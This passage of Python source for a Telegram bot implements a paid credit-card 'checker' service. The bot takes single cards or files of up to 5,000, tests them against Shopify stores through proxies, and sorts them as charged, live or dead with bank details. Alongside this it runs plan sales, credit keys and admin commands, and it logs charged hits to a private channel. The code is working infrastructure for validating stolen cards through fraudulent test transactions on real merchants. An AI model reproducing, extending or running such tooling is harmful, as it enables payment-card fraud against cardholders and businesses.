<b>📋 Plan:</b> {plan_name}
<b>💰 Credits:</b> {credits}
<b>📅 Premium Expires:</b> {expiry_str}
<b>⏰ Days Left:</b> {days_left} days
<b>📆 Plan Duration:</b> {days_added} days
<b>🕐 Activated:</b> {added_at}

<b>━━━━━━━━━━━━━━━━━</b>
💡 Use /plans to see available plans
💡 Contact @hexaabolte to recharge

🤖 <b>Bot By: <a href=\"tg://user?id=7845916818\">—͟ʜᴇ𝐱ᴀ 𓃠</a></b>"""
    else:
        text = f"""<b>⚠️ YOUR ACCOUNT INFO ⚠️</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>👤 User ID:</b> <code>{user_id}</code>
<b>⭐ Status:</b> FREE USER
<b>📋 Plan:</b> FREE
<b>💰 Credits:</b> {credits}

<b>━━━━━━━━━━━━━━━━━</b>
💎 Premium Required to use /cc and /chk
💡 Use /plans to see premium plans
💡 Use /redeem to activate premium key
💡 Use /redeemcredit to activate credit key

🤖 <b>Bot By: <a href=\"tg://user?id=7845916818\">—͟ʜᴇ𝐱ᴀ 𓃠</a></b>"""
    
    await event.reply(premium_emoji(text), parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"check_joined"))
async def check_joined_callback(event):
    user_id = event.sender_id
    joined, _ = await check_user_joined(user_id)
    if joined:
        set_user_joined(user_id)
        await event.edit(premium_emoji("✅ <b>Verification successful!</b>\n\nUse /start again to access the bot."), parse_mode='html')
    else:
        await event.answer("❌ You haven't joined all channels yet! Please join first.", alert=True)

@bot.on(events.NewMessage(pattern='/plans'))
async def plans_command(event):
    text = """<b>💎 PREMIUM PLANS 💎</b>
<b>━━━━━━━━━━━━━━━━━</b>

<b>🎁 TRIAL</b>
• 1 Day Access
• 3,000 Credits
• Price: 2$
<b>━━━━━━━━━━━━━━━━━</b>

<b>🥉 BRONZE</b>
• 3 Days Access
• 8,000 Credits
• Price: 4$
<b>━━━━━━━━━━━━━━━━━</b>

<b>🥈 SILVER</b>
• 7 Days Access
• 14,000 Credits
• Price: 8$
<b>━━━━━━━━━━━━━━━━━</b>

<b>🥇 GOLD</b>
• 14 Days Access
• 20,000 Credits
• Price: 12$
<b>━━━━━━━━━━━━━━━━━</b>

<b>💎 PLATINUM</b>
• 24 Days Access
• 30,000 Credits
• Price: 22$
<b>━━━━━━━━━━━━━━━━━</b>

<b>⚡ How to Purchase?</b>
Contact: <a href="tg://user?id=7845916818">@ </a>

<b>━━━━━━━━━━━━━━━━━</b>
🤖 <b>Bot By: <a href="tg://user?id=7845916818">—͟ʜᴇ𝐱ᴀ 𓃠</a></b>"""
    await event.reply(premium_emoji(text), parse_mode='html')

# ========== REDEEM COMMANDS ==========

@bot.on(events.NewMessage(pattern='/redeem'))
async def redeem_premium_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/redeem PREMIUM_KEY</code>"), parse_mode='html')
    
    key = args[1].strip().upper()
    success, msg = redeem_premium_key(key, user_id)
    
    if success:
        credits = get_user_credits(user_id)
        await event.reply(premium_emoji(f"✅ <b>{msg}</b>\n\n💰 Your Credits: {credits}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ <b>{msg}</b>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/redeemcredit'))
async def redeem_credit_key_command(event):
    user_id = event.sender_id
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/redeemcredit CREDIT_KEY</code>"), parse_mode='html')
    
    key = args[1].strip().upper()
    success, credits = redeem_credit_key(key, user_id)
    
    if success:
        total_credits = get_user_credits(user_id)
        await event.reply(premium_emoji(f"✅ <b>Credit Key Redeemed!</b>\n\n💰 Added: {credits} credits\n💳 Total Credits: {total_credits}"), parse_mode='html')
    else:
        await event.reply(premium_emoji(f"❌ <b>{credits}</b>"), parse_mode='html')

# ========== ADMIN - ADD PREMIUM BY PLAN NAME ==========

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        await event.reply(premium_emoji("❌ Usage: <code>/addpremium user_id plan_name</code>\n\n<u>Available Plans:</u>\n• trial\n• bronze\n• silver\n• gold\n• platinum\n\nExample: <code>/addpremium 7845916818 platinum</code>"), parse_mode='html')
        return
    
    try:
        target_id = int(args[1])
        plan_key = args[2].lower()
        
        if plan_key not in PLANS:
            await event.reply(premium_emoji(f"❌ Invalid plan! Available: trial, bronze, silver, gold, platinum"), parse_mode='html')
            return
        
        plan_info = PLANS[plan_key]
        days = plan_info['days']
        credits = plan_info['credits']
        
        add_premium_user(target_id, plan_key, days, credits)
        
        await event.reply(premium_emoji(f"✅ <b>Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📋 Plan: {plan_info['name']}\n📅 Days: {days}\n💰 Credits: {credits}"), parse_mode='html')
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, premium_emoji(f"🎉 <b>Premium Access Granted!</b>\n\n📋 Plan: {plan_info['name']}\n📅 You now have {days} days of premium access with {credits} credits!\n📆 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account."), parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user_id!"), parse_mode='html')

# ========== ADMIN - ADD CUSTOM PREMIUM WITH DAYS AND CREDITS ==========

@bot.on(events.NewMessage(pattern='/addpremiumcustom'))
async def add_premium_custom_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 4:
        await event.reply(premium_emoji("❌ Usage: <code>/addpremiumcustom user_id days credits</code>\n\nExample: <code>/addpremiumcustom 7845916818 15 5000</code>"), parse_mode='html')
        return
    
    try:
        target_id = int(args[1])
        days = int(args[2])
        credits = int(args[3])
        
        if days <= 0 or credits <= 0:
            await event.reply(premium_emoji("❌ Days and credits must be positive!"), parse_mode='html')
            return
        
        add_premium_user(target_id, "custom", days, credits)
        
        await event.reply(premium_emoji(f"✅ <b>Custom Premium added!</b>\n\n👤 User: <code>{target_id}</code>\n📅 Days: {days}\n💰 Credits: {credits}"), parse_mode='html')
        
        try:
            expiry = datetime.now() + timedelta(days=days)
            await bot.send_message(target_id, premium_emoji(f"🎉 <b>Premium Access Granted!</b>\n\n📅 You now have {days} days of premium access with {credits} credits!\n📆 Expires: {expiry.strftime('%Y-%m-%d')}\n\nUse /info to check your account."), parse_mode='html')
        except:
            pass
            
    except ValueError:
        await event.reply(premium_emoji("❌ Invalid user_id, days, or credits!"), parse_mode='html')

# ========== ADMIN CREDITS COMMANDS ==========

@bot.on(events.NewMessage(pattern='/addcredits'))
async def add_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("❌ Usage: <code>/addcredits user_id amount</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply(premium_emoji("❌ Invalid user_id or amount"), parse_mode='html')
    
    add_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(premium_emoji(f"✅ <b>Credits Added!</b>\n\nUser: <code>{target_id}</code>\nAdded: {amount}\nNew Total: {new_total}"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"💰 <b>{amount} Credits Added!</b>\n\nYour new balance: {new_total} credits"), parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern='/removecredits'))
async def remove_credits_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 3:
        return await event.reply(premium_emoji("❌ Usage: <code>/removecredits user_id amount</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
        amount = int(args[2])
    except:
        return await event.reply(premium_emoji("❌ Invalid user_id or amount"), parse_mode='html')
    
    remove_credits(target_id, amount)
    new_total = get_user_credits(target_id)
    await event.reply(premium_emoji(f"✅ <b>Credits Removed!</b>\n\nUser: <code>{target_id}</code>\nRemoved: {amount}\nNew Total: {new_total}"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"⚠️ <b>{amount} Credits Removed!</b>\n\nYour new balance: {new_total} credits"), parse_mode='html')
    except:
        pass

# ========== ADMIN - REMOVE PREMIUM ==========

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/removepremium user_id</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("❌ Invalid user_id"), parse_mode='html')
    
    premium_data = load_premium_users()
    if str(target_id) in premium_data:
        del premium_data[str(target_id)]
        save_premium_users(premium_data)
        await event.reply(premium_emoji(f"✅ <b>Premium removed!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
        try:
            await bot.send_message(target_id, premium_emoji(f"⚠️ <b>Premium Access Removed!</b>\n\nYour premium access has been revoked."), parse_mode='html')
        except:
            pass
    else:
        await event.reply(premium_emoji(f"❌ User <code>{target_id}</code> does not have premium"), parse_mode='html')

# ========== ADMIN - SITE MANAGEMENT ==========

@bot.on(events.NewMessage(pattern='/addsite'))
async def add_site_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split(maxsplit=1)
    if len(args) < 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/addsite https://store.myshopify.com</code>"), parse_mode='html')
    
    site = args[1].strip()
    success, msg = add_site(site)
    await event.reply(premium_emoji(f"{'✅' if success else '❌'} <b>{msg}</b>\n\n<code>{site}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsitetxt'))
async def add_site_txt_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("📌 Reply to a .txt file with sites (one per line)"), parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("❌ Please reply to a .txt file"), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        os.remove(file_path)
    except Exception as e:
        os.remove(file_path)
        return await event.reply(premium_emoji(f"❌ Error reading file: {e}"), parse_mode='html')
    
    sites = [line.strip() for line in content.splitlines() if line.strip()]
    if not sites:
        return await event.reply(premium_emoji("❌ No valid sites found in file"), parse_mode='html')
    
    added, already = add_sites_bulk(sites)
    
    msg = f"<b>📊 Sites Processed</b>\n\n"
    msg += f"✅ Added: {len(added)}\n"
    msg += f"⚠️ Already existed: {len(already)}\n"
    if added:
        msg += f"\n<u>Added sites:</u>\n"
        for s in added[:20]:
            msg += f"• <code>{s}</code>\n"
        if len(added) > 20:
            msg += f"... and {len(added)-20} more"
    
    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== ADMIN - KEY GENERATION ==========

@bot.on(events.NewMessage(pattern='/genpremiumkey'))
async def gen_premium_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            plan_key = args[2].lower()
            if plan_key not in PLANS:
                return await event.reply(premium_emoji(f"❌ Invalid plan! Available: {', '.join(PLANS.keys())}, custom"), parse_mode='html')
        except:
            return await event.reply(premium_emoji("❌ Usage: <code>/genpremiumkey amount plan</code>\n\nExample: <code>/genpremiumkey 5 gold</code>"), parse_mode='html')
        
        keys_generated = []
        days = PLANS[plan_key]['days']
        credits = PLANS[plan_key]['credits']
        for i in range(amount):
            key = generate_premium_key(plan_key, days, credits)
            keys_generated.append(key)
        
        plan = PLANS[plan_key]
        keys_text = "\n".join([f"• <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Premium Keys Generated Successfully!</b>

<b>📊 Summary:</b>
• Quantity: {amount}
• Plan: {plan['name']}
• Days: {plan['days']}
• Credits: {plan['credits']}
• Price: {plan['price']} each

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    
    elif len(args) == 5 and args[2].lower() == "custom":
        try:
            amount = int(args[1])
            days = int(args[3])
            credits = int(args[4])
            if amount <= 0 or days <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply(premium_emoji("❌ Maximum 50 keys at once!"), parse_mode='html')
        except:
            return await event.reply(premium_emoji("❌ Usage: <code>/genpremiumkey amount custom days credits</code>\n\nExample: <code>/genpremiumkey 5 custom 15 5000</code>"), parse_mode='html')
        
        keys_generated = []
        for i in range(amount):
            key = generate_premium_key("custom", days, credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"• <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Custom Premium Keys Generated Successfully!</b>

<b>📊 Summary:</b>
• Quantity: {amount}
• Days: {days} per key
• Credits: {credits} per key

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeem KEY</code>"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    
    else:
        await event.reply(premium_emoji("❌ Usage:\n<code>/genpremiumkey amount plan</code>\nExample: <code>/genpremiumkey 5 gold</code>\n\nOR\n\n<code>/genpremiumkey amount custom days credits</code>\nExample: <code>/genpremiumkey 5 custom 15 5000</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/gencreditkey'))
async def gen_credit_key_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    
    if len(args) == 3:
        try:
            amount = int(args[1])
            credits = int(args[2])
            if amount <= 0 or credits <= 0:
                raise ValueError
            if amount > 50:
                return await event.reply(premium_emoji("❌ Maximum 50 keys at once!"), parse_mode='html')
        except:
            return await event.reply(premium_emoji("❌ Usage: <code>/gencreditkey amount credits</code>\n\nExample: <code>/gencreditkey 5 5000</code>"), parse_mode='html')
        
        keys_generated = []
        for i in range(amount):
            key = generate_credit_key(credits)
            keys_generated.append(key)
        
        keys_text = "\n".join([f"• <code>{k}</code>" for k in keys_generated])
        msg = f"""✅ <b>Credit Keys Generated Successfully!</b>

<b>📊 Summary:</b>
• Quantity: {amount}
• Credits: {credits} per key

<b>🔑 Generated Keys:</b>
{keys_text}

<b>⚠️ Note:</b> Share these keys with users. They can redeem using <code>/redeemcredit KEY</code> to get {credits} credits only (no premium)!"""
        await event.reply(premium_emoji(msg), parse_mode='html')
    
    else:
        await event.reply(premium_emoji("❌ Usage: <code>/gencreditkey amount credits</code>\nExample: <code>/gencreditkey 5 5000</code>"), parse_mode='html')

# ========== ADMIN - BAN/UNBAN ==========

@bot.on(events.NewMessage(pattern='/ban'))
async def ban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/ban user_id</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("❌ Invalid user_id"), parse_mode='html')
    
    ban_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>User banned!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"🚫 <b>You have been banned!</b>\n\nYou can no longer use this bot."), parse_mode='html')
    except:
        pass

@bot.on(events.NewMessage(pattern='/unban'))
async def unban_user_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    args = event.message.text.split()
    if len(args) != 2:
        return await event.reply(premium_emoji("❌ Usage: <code>/unban user_id</code>"), parse_mode='html')
    
    try:
        target_id = int(args[1])
    except:
        return await event.reply(premium_emoji("❌ Invalid user_id"), parse_mode='html')
    
    unban_user(target_id)
    await event.reply(premium_emoji(f"✅ <b>User unbanned!</b>\n\nUser: <code>{target_id}</code>"), parse_mode='html')
    
    try:
        await bot.send_message(target_id, premium_emoji(f"✅ <b>You have been unbanned!</b>\n\nYou can now use the bot again."), parse_mode='html')
    except:
        pass

# ========== ADMIN - STATS ==========

@bot.on(events.NewMessage(pattern='/stats'))
async def stats_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    global ACTIVE_FILTER
    premium_data = load_premium_users()
    keys_data = load_keys()
    credit_keys_data = load_credit_keys()
    credits_data = load_credits()
    sites = load_sites()
    proxies = load_proxies()
    banned = load_banned_users()
    
    total_premium = len(premium_data)
    total_keys = len(keys_data)
    used_premium_keys = sum(1 for k in keys_data.values() if k.get('used', False))
    total_credit_keys = len(credit_keys_data)
    used_credit_keys = sum(1 for k in credit_keys_data.values() if k.get('used', False))
    total_sites = len(sites)
    total_proxies = len(proxies)
    total_banned = len(banned)
    total_credits = sum(credits_data.values())
    
    msg = f"<b>📊 Bot Statistics</b>\n\n"
    msg += f"<b>👥 Users:</b>\n"
    msg += f"• Premium Users: {total_premium}\n"
    msg += f"• Banned Users: {total_banned}\n\n"
    msg += f"<b>💰 Credits:</b>\n"
    msg += f"• Total Credits Active: {total_credits}\n\n"
    msg += f"<b>🔑 Premium Keys:</b>\n"
    msg += f"• Total Generated: {total_keys}\n"
    msg += f"• Used: {used_premium_keys}\n"
    msg += f"• Unused: {total_keys - used_premium_keys}\n\n"
    msg += f"<b>💎 Credit Keys:</b>\n"
    msg += f"• Total Generated: {total_credit_keys}\n"
    msg += f"• Used: {used_credit_keys}\n"
    msg += f"• Unused: {total_credit_keys - used_credit_keys}\n\n"
    msg += f"<b>🌐 Data:</b>\n"
    msg += f"• Sites: {total_sites}\n"
    msg += f"• Proxies: {total_proxies}\n\n"
    msg += f"<b>🎯 Active Filter:</b> {SITE_FILTERS[ACTIVE_FILTER]['name']}\n\n"
    msg += f"🤖 <b>Bot By: <a href=\"tg://user?id=7845916818\">—͟ʜᴇ𝐱ᴀ 𓃠 💮</a></b>"
    
    await event.reply(premium_emoji(msg), parse_mode='html')

# ========== ADMIN - BROADCAST ==========

@bot.on(events.NewMessage(pattern='/broadcast'))
async def broadcast_admin(event):
    user_id = event.sender_id
    if not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Admin only command!</b>"), parse_mode='html')
    
    broadcast_msg = event.message.text.replace('/broadcast', '', 1).strip()
    if not broadcast_msg:
        return await event.reply(premium_emoji("❌ Usage: <code>/broadcast message</code>"), parse_mode='html')
    
    premium_users = load_premium_users()
    credits_users = load_credits()
    
    all_user_ids = set()
    
    for uid_str in premium_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid_str in credits_users.keys():
        all_user_ids.add(int(uid_str))
    
    for uid in joined_users:
        all_user_ids.add(uid)
    
    for aid in ADMIN_IDS:
        all_user_ids.add(aid)
    
    sent = 0
    failed = 0
    
    status_msg = await event.reply(premium_emoji(f"🔄 Broadcasting to {len(all_user_ids)} users..."), parse_mode='html')
    
    for uid in all_user_ids:
        try:
            await bot.send_message(uid, premium_emoji(f"📢 <b>Broadcast from Admin</b>\n\n{broadcast_msg}"), parse_mode='html')
            sent += 1
        except:
            failed += 1
        await asyncio.sleep(0.1)
    
    await status_msg.edit(premium_emoji(f"✅ <b>Broadcast Complete!</b>\n\nSent: {sent}\nFailed: {failed}"), parse_mode='html')

# ========== SINGLE CC CHECK (WITH FULL BIN FORMAT) ==========

@bot.on(events.NewMessage(pattern=r'^/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    
    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')
    
    current_credits = get_user_credits(user_id)
    if current_credits < 1:
        return await event.reply(premium_emoji("❌ <b>Insufficient Credits!</b>\n\nYou need 1 credit to check a card.\nYour Credits: 0\n\nUse /redeemcredit CREDIT_KEY to add credits."), parse_mode='html')
    
    sites = load_sites()
    proxies = load_proxies()
    
    if not sites:
        return await event.reply(premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
    if not proxies:
        return await event.reply(premium_emoji("❌ No proxies available. Contact admin."), parse_mode='html')
    
    try:
        cc_input = event.message.text.split(' ', 1)[1].strip()
    except IndexError:
        return await event.reply(premium_emoji("❌ Usage: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
    
    cards = extract_cc(cc_input)
    if not cards:
        return await event.reply(premium_emoji("❌ Invalid CC format. Use: <code>/cc card|mm|yy|cvv</code>"), parse_mode='html')
    
    card = cards[0]
    
    filter_info = f"\n🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    
    status_msg = await event.reply(premium_emoji(f"<b>⚡💳 #—͟ʜᴇ𝐱ᴀ 𓃠 𝘾𝙝𝙚𝙘𝙠𝙚𝙧 💳⚡</b>\n<b>━━━━━━━━━━━━━━━━━</b>\n<b>⚡💠 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠...</b>\n<blockquote>💳 Card: <code>{card}</code></blockquote>\n<b>━━━━━━━━━━━━━━━━━</b>\n{filter_info}\n<b>💰 Credits: {current_credits} (1 will be deducted)</b>"), parse_mode='html')
    
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        
        success, new_credits = deduct_credit(user_id)
        
        if result['status'] == 'Charged':
            status_emoji = "✅"
            status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
            hit_type = "CHARGED"
            # Send to PVT channel (ONLY CHARGED, with plan name)
            try:
                sender = await event.get_sender()
                username = sender.username if sender.username else None
                await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), username, user_id)
            except:
                await send_log_to_channel(result['message'][:150], result.get('gateway', 'Unknown'), result.get('price', '-'), str(user_id), user_id)
        elif result['status'] == 'Approved':
            status_emoji = "🔥"
            status_text = "𝐋𝐢𝐯𝐞"
            hit_type = "LIVE"
        else:
            status_emoji = "❌"
            status_text = "𝐃𝐞𝐚𝐝"
            hit_type = None
        
        remaining_credits = get_user_credits(user_id)
        
        challenge_line = ""
        challenge_url = result.get('challenge_url')
        if challenge_url and result['status'] == 'Approved':
            challenge_line = f"\n<blockquote>🔗 3DS URL: {challenge_url}</blockquote>"
        
        final_resp = f"""<b>⚡💳 #𝐒𝐇𝐎𝐏𝐈𝐅𝐘 💳⚡</b>
<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡💠 𝐇𝐢𝐭 𝐅𝐨𝐮𝐧𝐝!</b>
<blockquote>{status_emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{card}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>{challenge_line}
<b>━━━━━━━━━━━━━━━━━</b>
<b>🎯💠 𝐁𝐈𝐍 𝐈𝐧𝐟𝐨</b>
<pre>𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country} {flag}</pre>
<b>━━━━━━━━━━━━━━━━━</b>
🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}
<b>💰 Credits Left: {remaining_credits}</b>

🤖 <b>Bot By: <a href=\"tg://user?id=7845916818\">—͟ʜᴇ𝐱ᴀ 𓃠 💮</a></b>"""
        
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
        
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error checking card: {e}"), parse_mode='html')

# ========== MASS CHECK COMMAND (WITH FULL BIN FORMAT FOR HITS) ==========

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    
    if is_banned(user_id):
        return await event.reply(premium_emoji("🚫 You are banned!"), parse_mode='html')
    
    if not is_premium(user_id) and not is_admin(user_id):
        return await event.reply(premium_emoji("❌ <b>Premium Required!</b>\n\nUse /redeem to activate premium access."), parse_mode='html')
    
    if not event.reply_to_msg_id:
        return await event.reply(premium_emoji("📌 Reply to a .txt file containing cards..."), parse_mode='html')
    
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        return await event.reply(premium_emoji("❌ Please reply to a .txt file."), parse_mode='html')
    
    if not load_sites():
        return await event.reply(premium_emoji("❌ No sites available. Contact admin."), parse_mode='html')
    if not load_proxies():
        return await event.reply(premium_emoji("❌ No proxies available. Please add proxies."), parse_mode='html')
    
    status_msg = await event.reply(premium_emoji("🫆 Processing your file..."), parse_mode='html')
    
    file_path = await reply_msg.download_media()
    
    async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
        content = await f.read()
    
    cards = extract_cc(content)
    
    if not cards:
        await status_msg.edit(premium_emoji("😡 No valid cards found in file."), parse_mode='html')
        os.remove(file_path)
        return
    
    if len(cards) > 5000:
        await status_msg.edit(premium_emoji(f"🫦 File contains {len(cards)} cards. Limiting to first 5000 cards."), parse_mode='html')
        cards = cards[:5000]
    
    os.remove(file_path)
    
    total_cards = len(cards)
    
    user_credits = get_user_credits(user_id)
    if user_credits < total_cards:
        return await status_msg.edit(premium_emoji(f"❌ <b>Insufficient Credits!</b>\n\nYou need {total_cards} credits to check {total_cards} cards.\nYour available credits: {user_credits}\n\nUse /redeemcredit CREDIT_KEY to add more credits."), parse_mode='html')
    
    filter_info = f"🎯 Filter: {SITE_FILTERS[ACTIVE_FILTER]['name']}"
    await status_msg.edit(premium_emoji(f"🫦 Starting check for {total_cards} cards...\n{filter_info}\n💰 Credits: {user_credits} (Will deduct 1 per card)"), parse_mode='html')
    
    session_key = f"{user_id}_{status_msg.id}"
    active_sessions[session_key] = {'paused': False}
    
    all_results = {
        'charged': [],
        'approved': [],
        'dead': [],
        'total': total_cards,
        'checked': 0,
        'start_time': time.time()
    }
    
    try:
        queue = asyncio.Queue()
        for card in cards:
            queue.put_nowait(card)
        
        last_update_count = 0
        UPDATE_EVERY_CARDS = 10
        api_semaphore = asyncio.Semaphore(5)  # max 5 concurrent API calls to avoid overwhelming VPS endpoints
        
        async def worker():
            nonlocal last_update_count
            while not queue.empty() and session_key in active_sessions:
                session_state = active_sessions.get(session_key)
                if not session_state:
                    break
                while session_state.get('paused', False):
                    await asyncio.sleep(1)
                    session_state = active_sessions.get(session_key)
                    if not session_state:
                        return
                    
                try:
                    card = queue.get_nowait()
                except asyncio.QueueEmpty:
                    break
                    
                current_sites = load_sites()
                current_proxies = load_proxies()
                if not current_sites or not current_proxies:
                    break
                
                async with api_semaphore:
                    res = await check_card_with_retry(card, current_sites, current_proxies, max_retries=1)
                
                all_results['checked'] += 1
                
                success, new_credits = deduct_credit(user_id)
                
                is_charged = res['status'] == 'Charged'
                
                if is_charged:
                    all_results['charged'].append(res)
                    # Send to PVT channel (ONLY CHARGED, with plan name)
                    try:
                        sender = await event.get_sender()
                        username = sender.username if sender.username else None
                        await send_log_to_channel(res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'), username, user_id)
                    except:
                        await send_log_to_channel(res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'), str(user_id), user_id)
                    # Send real-time notification to user with FULL BIN FORMAT
                    await send_realtime_hit_to_user(user_id, "CHARGED", card, res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'))
                elif res['status'] == 'Approved':
                    all_results['approved'].append(res)
                    # Send real-time notification to user with FULL BIN FORMAT for LIVE hits
                    await send_realtime_hit_to_user(user_id, "LIVE", card, res['message'][:150], res.get('gateway', 'Unknown'), res.get('price', '-'))
                    # NO LOG TO PVT CHANNEL FOR LIVE HITS
                else:
                    all_results['dead'].append(res)
                    
                queue.task_done()
                
                if all_results['checked'] - last_update_count >= UPDATE_EVERY_CARDS:
                    last_update_count = all_results['checked']
                    if session_key in active_sessions:
                        try:
                            await update_progress(user_id, status_msg.id, all_results, all_results['checked'])
                        except Exception:
                            pass
        
        workers = [asyncio.create_task(worker()) for _ in range(10)]
        
        while workers:
            if session_key not in active_sessions:
                for w in workers:
                    if not w.done():
                        w.cancel()
                break
            done, pending = await asyncio.wait(workers, timeout=1.0)
            workers = list(pending)
        
        if session_key in active_sessions:
